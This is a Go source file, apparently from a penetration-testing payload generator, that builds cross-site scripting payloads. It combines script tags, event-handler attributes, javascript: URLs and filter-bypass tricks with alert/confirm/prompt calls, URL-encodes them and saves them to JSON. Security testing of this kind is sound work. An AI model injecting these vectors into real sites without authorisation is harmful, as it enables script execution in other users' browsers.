package modules

import (
	"encoding/json"
	"fmt"
	"os"
	"path/filepath"
	"strconv"
	"strings"

	"github.com/rajaabdullahnasir/Custom-Payload-Generator/utils"
)

// XSSPayload defines the structure for an XSS payload.
type XSSPayload struct {
	Type    string `json:"type"`
	Payload string `json:"payload"`
	Bypass  bool   `json:"bypass"`
	Encoded string `json:"encoded,omitempty"`
}

// Default configuration for payload generation.
var (
	xssTemplates = []string{
		`<script>{fn}({n})</script>`,
		`<img src=x {evt}={fn}({n})>`,
		`<svg {evt}={fn}({n})>`,
		`<a href="javascript:{fn}({n})">click</a>`,
		`<body {evt}={fn}({n})>`,
		`<iframe srcdoc="<script>{fn}({n})</script>"></iframe>`,
		`<input autofocus {evt}={fn}({n})>`,
		`<math href="javascript:{fn}({n})">CLICK</math>`,
		`<details open {evt}={fn}({n})>`,
		`<scr<script>ipt>{fn}({n})</scr</script>ipt>`,
		`<svg><desc><![CDATA[<script>{fn}({n})</script>]]></desc></svg>`,
	}

	xssFunctions = []string{"alert", "confirm", "prompt"}

	xssEvents = []string{"onerror", "onload", "onclick", "onfocus", "ontoggle"}
)

// GenerateXSSPayloads creates script-based XSS payloads with basic bypass variations.
func GenerateXSSPayloads() ([]XSSPayload, error) {
	var payloads []XSSPayload

	for i := 1; i <= 5; i++ {
		nStr := strconv.Itoa(i)
		for _, fn := range xssFunctions {
			for _, evt := range xssEvents {
				for _, tpl := range xssTemplates {
					p := strings.NewReplacer(
						"{fn}", fn,
						"{evt}", evt,
						"{n}", nStr,
					).Replace(tpl)

					payloads = append(payloads, XSSPayload{
						Type:    "DOM",
						Payload: p,
						Bypass:  true,
						Encoded: utils.EncodeURL(p),
					})
				}
			}
		}
	}

	return payloads, nil
}

// SaveXSSPayloadsToFile saves XSS payloads to payloads/xss.json.
func SaveXSSPayloadsToFile(payloads []XSSPayload) error {
	data, err := json.MarshalIndent(payloads, "", "  ")
	if err != nil {
		return fmt.Errorf("failed to marshal XSS payloads: %w", err)
	}

	outputPath := filepath.Clean("payloads/xss.json")
	if err := os.WriteFile(outputPath, data, 0644); err != nil {
		return fmt.Errorf("failed to write XSS payloads to file: %w", err)
	}

	return nil
}
